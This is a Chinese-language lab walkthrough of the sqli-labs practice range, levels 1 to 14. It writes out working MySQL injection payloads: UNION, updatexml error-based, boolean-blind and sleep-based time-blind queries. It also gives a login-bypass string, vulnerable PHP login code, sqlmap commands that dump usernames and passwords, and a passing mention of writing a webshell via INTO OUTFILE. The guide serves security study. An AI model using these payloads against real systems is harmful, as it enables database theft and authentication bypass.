---
title: sql注入
pinned: true
published: 2026-10-13
description: 本篇介绍sqli-labs靶场的通关教程
tags: [sql]
category: 笔记
---

### 关于sql注入：

**1.找到可能存在注入点的地方**

每个前后端交互的地方都有可能存在注入点

**2.判断闭合及注释方式**

**3.有无回显，报错及报错方式**

此步骤将决定了使用哪种注入方式

**4.测试列数及回显位**

此步骤仅用于联合注入

**5.探测数据库指纹**

本篇数据库均为MySql（探测方法）

**6.使用查询语句**


# GET-联合注入

## less-1

**1.判断闭合方式及有无回显**

当输入`id=1`时，页面有回显

经过尝试发现是单引号闭合，即`?id=1'--+`


**2.判断列数**

![](<https://img.remit.ee/i/EUoE8LCnC1wh>)

**3.回显位**

![](<https://img.remit.ee/i/ffQFUQzhgyDY>)

注意`-1`

原因：当`id=1`时，页面只能返回一组数据，回显位被占据无法显示数字

**4.数据**

表名：

    ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+

![](<https://img.remit.ee/i/bQkjenwqM6M3>)

注：联合注入语法为`union select 1,2,3 from...where...`不要把回显数字标错地方

注：因为显示数据的地方只有个，但我们查询的数据不止一条，因此要用`group_concat`函数将表名等内容连接成一整行显示

列名：

    ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+

![](<https://img.remit.ee/i/YWebqhAMpeIl>)

数据名：

    ?id=-1' union select 1,2,group_concat(username,' ',password) from users--+

![](<https://img.remit.ee/i/UoKos8jnvVlh>)

## less-2

数字型闭合`?id=1`

## less-3

字符型闭合`?id=1')`

## less-4

字符型闭合`?id=1")`

# GET-报错注入

## less-5~6

//concat 与 groupc_concat的区别

//updatexml()语法 0x7e 的作用，可以换成什么'~'

//(select...)括号的作用

//username,' ',password ' '的作用

//数据显示不全的原因及解决办法

# GET-布尔盲注

## less-7

发现闭合方式 `?id=1'))--+ `

尝试用报错注入：

![](https://picgocloud.com/m/f9118f0a-d006-423e-b302-2f75ef6558c7.png)

页面上不能返回具体的错误信息，因此使用布尔盲注

**1.盲注库名**

首先判断盲注数据库名长度

    ?id=1')) and length(database())=8--+

接着盲注库名

    ?id=1')) and substr(database(),1,1)='s'--+
    ?id=1')) and substr(database(),2,1)='e'--+
    ...
    ?id=1')) and substr(database(),8,1)='y'--+

得到数据库名为`security`

**2.盲注表名**

首先判断`security`表的数量

    ?id=1')) and (select count(table_name) from information_schema.tables where table_schema='security')=4--+

第一张表的长度

    ?id=1')) and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6--+

表名

    ?id=1')) and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'--+
    ?id=1')) and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1)='m'--+
    ...

得到第一张表的名字是`emails`

通过更改limit值，可以推出其余三个表名`referers` `uagents` `users`

**3.盲注列名(字段名)**

首先还是判断列的数量

    ?id=1')) and (select count(column_name) from information_schema.columns where table_schema='security' and table_name='users')=3--+

第一列列名长度

    ?id=1')) and length((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))=2--+

最后列名

    ?id=1')) and (substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))='i'--+
    ?id=1')) and (substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),2,1))='d'--+

同样的方法得到三列列名分别是`id` `username` `password`

**4.盲注数据**

表中用户数量

    ?id=1')) and (select count(*) from users)=13--+

我们要得到`username`和`password`两列的数据

第一个用户名的长度

    ?id=1')) and length((select username from users limit 0,1))=4--+

第一个用户名

    ?id=1')) and (substr((select username from users limit 0,1),1,1))='d'--+
    ?id=1')) and (substr((select username from users limit 0,1),2,1))='u'--+
    ...
得到第一个用户名`dumb`

第一个密码长度

    ?id=1')) and length((select password from users limit 0,1))=4--+

第一个密码

    ?id=1')) and (substr((select password from users limit 0,1),1,1))='d'--+
    ?id=1')) and (substr((select password from users limit 0,1),2,1))='u'--+
    ...
得到第一个密码`dumb`

还是通过更改limit可以得到其余13个用户名及密码

经典解法：利用MySQL的into outfile 函数，把一句话木马写进服务器目录，从而 getshell（获取服务器权限）

## less-8

闭合方式`?id=1'--+`

原理同less-7

这里使用工具sqlmap进行快速破解

打开kali虚拟机

**1.指定注入点**

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'"

![](<https://img.remit.ee/i/TivIRB8uGaL0>)
![](<https://img.remit.ee/i/Zw4kCq9rNGT6>)

可以看到数据库版本等信息

**2.获取全部数据库**

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" --dbs

![](<https://img.remit.ee/i/evergcIhuRLd>)

获取当前数据库

     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" --current-db

![](<https://img.remit.ee/i/WPa5bHnbijM8>)

可以看到是`security`

**3.获取表**

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' --tables

![](<https://img.remit.ee/i/hQqyGqtlO6U7>)

可以看到表的数量及各自的名称

**4.获取字段**

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' -T 'users' --columns

![](<https://img.remit.ee/i/HBEr5WLYybUt>)

**5.获取数据**

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' -T 'users' -C 'username,password' --dump

![](<https://img.remit.ee/i/TCmLm6XllzJD>)

# GET-时间盲注
## less-9

发现无论我们输入什么页面都不能返回错误信息，因此考虑时间盲注

![](https://picgocloud.com/m/624d06f9-d985-431f-b325-d9cb009d8b35.png)

我们构造

    ?id=1' and if(1=1,sleep(5),1)--+

发现页面延迟了5s才返回信息

那么就判断出了闭合方式

**1.库名**

长度：

    ?id=1'and if(length((select database()))=8,sleep(5),1)--+

名称：

    ?id=1' and if(substr(database(),1,1)='s',sleep(5),1)--+
    ?id=1' and if(substr(database(),2,1)='e',sleep(5),1)--+
    ...

**2.表名**

库中表的数量

    ?id=1' and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),1) --+

第一张表长度

    ?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,sleep(5),1) --+

第一张表的名称

    ?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e',sleep(5),1) --+
    ?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)='m',sleep(5),1) --+
    ...

**3.字段名**

表中字段数量

    ?id=1' and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=3,sleep(5),1) --+

第一个字段的长度

    ?id=1' and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))=2,sleep(5),1) --+

第一个字段名称

    ?id=1' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1)='i',sleep(5),1) --+
    ...

**4.数据**

表中用户数量

    ?id=1' and if((select count(*) from security.users)=13,sleep(5),1)--+

`users`这一列第一条记录的长度

    ?id=1' and if(length((select username from users limit 0,1))=4,sleep(5),1) --+

`users`这一列第一条记录的名称

    ?id=1' and if((substr((select username from users limit 0,1),1,1))='D',sleep(5),1) --+
    ...

## less-10

同less-9一致，仅闭合方式不同`"`

# POST-联合注入
## less-11

**1.判断闭合方式**

首先是闭合方式 `'`为单引号闭合

然后是末尾的注释 发现`--+`不再适用，换`#`

    ' #

![](https://picgocloud.com/m/30a094a6-2f07-4e6d-872f-1844b2f2ff02.png)


**2.判断有无回显**

我们在输入框输入

    username：' or 1=1#    
    password:123456       

注：`' or 1=1#`是万能密码，保证`username`一定是对的，开头的闭合方式`'`不是一成不变的，要根据不同的闭合方式更改

less-11后端大致代码：

    $sql = "SELECT username, password FROM users WHERE username='$uname' AND password='$pass' LIMIT 0,1";
    $result = mysqli_query($con, $sql);
    $row = mysqli_fetch_array($result);
    if($row) {
    echo "Your Login name: " . $row['username']; 
    echo "Your Password: " . $row['password']; 
    }

注：可以看到，`#`会把`password`那一部分的验证条件注释掉，因此无论我们在`password`这一栏输入什么都是正确的。这一栏基本不用管，留空就行，只在`username`这一栏输入查询语句

输入后我们可以看到页面有回显

![](https://picgocloud.com/m/41eab142-af5e-4a8c-932c-1e22181b4015.png)

**3.判断列数及回显位**

    ' order by 2#

页面正常

回显位：

    ' union select 1,2#

![](https://picgocloud.com/m/3aa1945f-69f7-4778-b2fa-52de9ab34e64.png)

**4.获取数据**

找到了回显位，接下来就能得到想要的内容

表名：

    ' union select group_concat(table_name),1 from information_schema.tables where table_schema=database()#

![](https://picgocloud.com/m/c71fc545-af18-4a8d-9d7d-d6655c03aeee.png)



字段名：

    ' union select group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='users'#

![](https://picgocloud.com/m/c257a5eb-8e4f-4078-a805-30ef4d49298a.png)

数据：

    ' union select group_concat(username,' ',password),1 from users #

![](https://picgocloud.com/m/454e5df3-9f83-49bb-8137-d9957bf17714.png)

## less-12

闭合方式：`")`

# POST-报错注入

## less-13

**1.判断闭合方式**

经过尝试发现闭合方式：`')`

**2.判断有无回显**

在`username`输入框输入万能密码：

    ') or 1=1 #

![](https://picgocloud.com/m/7d9c84d7-8851-4ea8-bf08-0721170705ee.png)

发现页面并没有返回信息，因此可以考虑报错注入或盲注

**3.判断报错是否返回错误信息**

在输入框输入

    ') and updatexml(1,concat('~',(select database())),1)#

![](https://picgocloud.com/m/4dd3d7eb-46c2-427b-8565-71ee1dded011.png)

发现页面返回错误信息，因此我们使用报错注入

**4.获取表名**

因为我们在上一步判断是否返回报错信息时已经得到了库名，所以这一步我们直接获取表名

输入

    ') and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#

![](https://picgocloud.com/m/275951f9-458e-4375-a10b-d973b135c234.png)

**5.获取字段**

输入

    ') and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1)#

![](https://picgocloud.com/m/6569dc85-836b-4198-aeb7-c1f38abdfec2.png)

**6.获取数据**

输入

    ') and updatexml(1,concat('~',(select group_concat(username,' ',password) from users)),1)#

![](https://picgocloud.com/m/16d4e577-5e2c-4adb-b232-645ecd4965eb.png)

## less-14

闭合方式：`"`